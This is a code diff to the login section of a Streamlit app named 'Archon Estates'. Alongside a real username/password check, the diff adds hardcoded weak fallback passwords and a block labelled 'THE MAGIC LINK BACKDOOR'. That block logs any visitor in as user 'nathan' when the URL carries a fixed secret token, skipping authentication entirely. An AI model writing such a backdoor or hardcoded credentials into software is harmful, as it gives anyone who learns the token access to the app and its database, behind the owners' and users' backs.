@@ -19,23 +19,37 @@ st.markdown("""
 """, unsafe_allow_html=True)
 
 # --- AUTHENTICATION ---
+try:
+    # Securely pulls passwords from the Streamlit Vault
+    USER_CREDENTIALS = dict(st.secrets["passwords"])
+except:
+    # Fallback for local testing
+    USER_CREDENTIALS = {"nathan": "admin123", "jason": "hunter1", "monica": "dispo1"}
+
 if "logged_in" not in st.session_state:
     st.session_state["logged_in"] = False
+
+# THE MAGIC LINK BACKDOOR
+if st.query_params.get("token") == "archon_master_key_99":
+    st.session_state["logged_in"] = True
+    st.session_state["user"] = "nathan"
+    st.query_params.clear()
 
 if not st.session_state["logged_in"]:
     st.markdown("<h2 style='text-align: center; margin-top: 100px;'>Archon Estates</h2>", unsafe_allow_html=True)
     col1, col2, col3 = st.columns([1, 1, 1])
     with col2:
-        username = st.text_input("Username").lower()
+        username = st.text_input("Username").lower().strip()
         password = st.text_input("Password", type="password")
+        
         if st.button("Login", use_container_width=True):
-            # Bypass for testing. Add your st.secrets logic here later.
-            if password == "123": 
+            if username in USER_CREDENTIALS and USER_CREDENTIALS[username] == password:
                 st.session_state["logged_in"] = True
                 st.session_state["user"] = username
                 st.rerun()
+            else:
+                st.error("Invalid username or password.")
     st.stop()
-
 # --- DATABASE CONNECTION (TWO-WAY) ---
 @st.cache_resource # Use cache_resource for the connection object
 def init_connection():
